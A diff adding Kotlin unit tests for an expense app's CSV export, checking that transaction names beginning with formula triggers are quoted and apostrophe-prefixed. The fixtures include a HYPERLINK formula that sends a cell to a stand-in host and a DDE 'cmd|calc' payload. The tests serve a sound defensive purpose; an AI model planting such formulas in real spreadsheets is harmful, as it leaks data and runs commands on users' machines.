@@ -4,6 +4,7 @@ import com.expenser.app.data.db.entity.CategoryEntity
 import com.expenser.app.data.db.entity.TransactionEntity
 import com.expenser.app.data.model.EntryType
 import org.junit.Assert.assertEquals
+import org.junit.Assert.assertTrue
 import org.junit.Test
 
 class CsvExportTest {
@@ -15,6 +16,53 @@ class CsvExportTest {
         assertEquals("100.00", CsvExport.minorToDecimal(10_000))
         assertEquals("-0.05", CsvExport.minorToDecimal(-5))
     }
+
+    @Test
+    fun `a name that opens with a formula trigger is exported as text`() {
+        val payload = "=HYPERLINK(\"http://evil.example?d=\"&A1,\"click\")"
+        val csv = CsvExport.transactionsToCsv(backupWithName(payload))
+        val cell = csv.trimEnd('\n').split('\n')[1].split(',')[1]
+
+        // Quoted and apostrophe-prefixed, so no spreadsheet evaluates it.
+        assertTrue(cell, cell.startsWith("\"'="))
+    }
+
+    @Test
+    fun `every formula trigger is disarmed`() {
+        for (trigger in listOf("=", "+", "-", "@", "\t", "\r")) {
+            val csv = CsvExport.transactionsToCsv(backupWithName(trigger + "cmd|'/c calc'!A0"))
+            val line = csv.trimEnd('\n').split('\n')[1]
+            assertTrue("$trigger not disarmed: $line", line.contains("\"'$trigger"))
+        }
+    }
+
+    @Test
+    fun `a negative amount stays a number`() {
+        // The amount column is generated, never user text, so it must not be disarmed -
+        // an apostrophe here would stop the spreadsheet totalling the column.
+        val data = BackupData(
+            categories = emptyList(),
+            transactions = listOf(
+                TransactionEntity("t1", "Refund", -1250, "c1", "2026-09-05", null, EntryType.Expense, "u"),
+            ),
+        )
+
+        val cells = CsvExport.transactionsToCsv(data).trimEnd('\n').split('\n')[1].split(',')
+        assertEquals("-12.50", cells[2])
+    }
+
+    @Test
+    fun `an ordinary name is left untouched`() {
+        val csv = CsvExport.transactionsToCsv(backupWithName("Coffee"))
+        assertEquals("2026-09-05,Coffee,3.50,,Expense,", csv.trimEnd('\n').split('\n')[1])
+    }
+
+    private fun backupWithName(name: String) = BackupData(
+        categories = emptyList(),
+        transactions = listOf(
+            TransactionEntity("t1", name, 350, "c1", "2026-09-05", null, EntryType.Expense, "u"),
+        ),
+    )
 
     @Test
     fun `csv has a header, resolves category names and quotes tricky fields`() {
